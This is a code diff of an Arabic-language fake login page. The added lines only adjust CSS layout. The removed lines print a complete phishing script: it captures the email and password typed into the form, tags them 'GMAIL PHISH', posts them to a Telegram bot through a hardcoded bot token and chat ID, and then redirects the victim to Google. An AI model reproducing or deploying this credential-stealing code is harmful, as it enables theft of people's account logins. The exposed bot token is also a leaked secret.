@@ -1,4 +1,4 @@
-طه<!DOCTYPE html><html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -32,10 +32,10 @@
     }
     .animated-text {
       position: fixed;
-      top: 10px;
+      top: 20px;
       left: 50%;
       transform: translateX(-50%);
-      font-size: 36px;
+      font-size: 28px;
       font-family: 'Cairo', sans-serif;
       font-weight: bold;
       background: linear-gradient(90deg, #ff6ec4, #7873f5, #42e695, #ff6ec4);
@@ -43,7 +43,8 @@
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       animation: animatedGradient 8s linear infinite;
-      letter-spacing: 1.5px;
+      letter-spacing: 1px;
+      white-space: nowrap;
       z-index: 10;
     }
     @keyframes animatedGradient {
@@ -53,7 +54,7 @@
     }
     .container {
       position: absolute;
-      top: 50%;
+      top: 55%;
       left: 50%;
       transform: translate(-50%, -50%);
       background: rgba(0, 0, 0, 0.4);
@@ -139,50 +140,6 @@
       <button type="submit">تسجيل الدخول</button>
       <div class="spinner" id="spinner"><div></div></div>
     </form>
-  </div>  <script>
-    const BOT_TOKEN = '8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0';
-    const CHAT_ID = '6894787120';
-
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      document.getElementById('spinner').style.display = 'flex';
-
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      if (password.length < 6) {
-        alert('كلمة المرور يجب أن تكون 6 أحرف على الأقل.');
-        document.getElementById('spinner').style.display = 'none';
-        return;
-      }
-
-      const message = `\nGMAIL PHISH\n------------------\nEmail: ${email}\nPassword: ${password}`;
-
-      try {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const payload = {
-          chat_id: CHAT_ID,
-          text: message
-        };
-
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        });
-
-        if (response.ok) {
-          window.location.href = 'https://www.google.com';
-        } else {
-          alert('فشل الإرسال، حاول مرة أخرى');
-          document.getElementById('spinner').style.display = 'none';
-        }
-      } catch (error) {
-        alert('حدث خطأ أثناء الإرسال');
-        document.getElementById('spinner').style.display = 'none';
-      }
-    });
-  </script></body>
+  </div>
+</body>
 </html>
